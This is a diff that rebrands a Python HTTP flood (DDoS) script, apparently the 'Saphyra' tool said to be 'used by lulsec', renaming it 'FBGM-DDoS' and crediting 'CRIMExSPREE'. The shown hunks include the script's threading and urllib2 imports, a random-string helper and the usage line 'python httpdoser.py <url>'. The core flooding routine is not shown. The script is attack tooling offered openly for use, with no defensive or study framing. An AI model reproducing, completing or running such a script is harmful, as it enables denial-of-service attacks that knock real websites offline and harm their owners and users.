@@ -1,5 +1,5 @@
-# Saphyra-DDoS
-Hard-Hitting ddos script used by lulsec
+# FBGM-DDoS
+Hard-Hitting ddos script 
 import urllib2
 import sys
 import threading
@@ -59,7 +59,6 @@ def buildblock(size):
 		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
-print)'
 def usage():
 	print '---------------------------------------------------'
 	print 'USAGE: python httpdoser.py <url>'
@@ -68,8 +67,8 @@ def usage():
 print \
 """
                    ...
-                 ;::::;   Http_Doser Starting...
-               ;::::; :;    By Chip-Hacker
+                 ;::::;   FBGM-DDoS...
+               ;::::; :;    By CRIMExSPREE
              ;:::::'   :;
             ;:::::;     ;.
            ,:::::'       ;           OOO\
